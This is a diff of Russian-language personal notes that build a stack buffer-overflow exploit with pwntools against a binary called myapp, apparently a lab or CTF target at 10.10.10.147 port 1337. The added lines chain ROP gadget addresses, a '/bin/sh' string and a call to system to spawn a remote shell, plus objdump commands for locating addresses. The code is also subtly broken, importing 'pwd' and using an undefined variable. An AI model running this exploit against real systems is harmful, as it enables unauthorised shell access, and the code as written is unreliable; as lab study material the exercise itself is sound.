@@ -31,20 +31,31 @@ python -c 'print "A"*116' и так пока не получим перепол�
 Пишем експлойт exploit.py fo myapp
 **********************************************************
 #0x40115f - main
+#0x40116e - system
+#0x401206 - Pop r13, pop, pop
 from pwd import *
 context(terminal=['tmux','new-windows'])
-p = gdb.debug('./muapp', 'b main')
+#p = gdb.debug('./muapp', 'b main')
+p = remote('10.10.10.147', 1337)
 context(os='linux', arch='amd64')
 
-junk = ("A" * 120).encode()
+junk = ("A" * 112).encode()
+bin_sh = "/bin/sh\x00".encode()
+plt_system = "0x40116e" #change to 0x401040 if doesnt work
+pop_r13 = p64(0x401206)
+null = p64(0x0)
+test = p64(0x401152)
 call_main = p64(0x40115f)
 
-p.sendline(junk + call_main)
+#p.recvuntil('What do you want me to echo back?')
+p.sendline(junk + bin_sh + pop_r13 + system + null + null + test)
+p.interactive
 
 
 ********************************************************
 wq!
 
-
+Получить область памяти objdump -D | grep -i system
+objdump -D | grep -i test
 
 
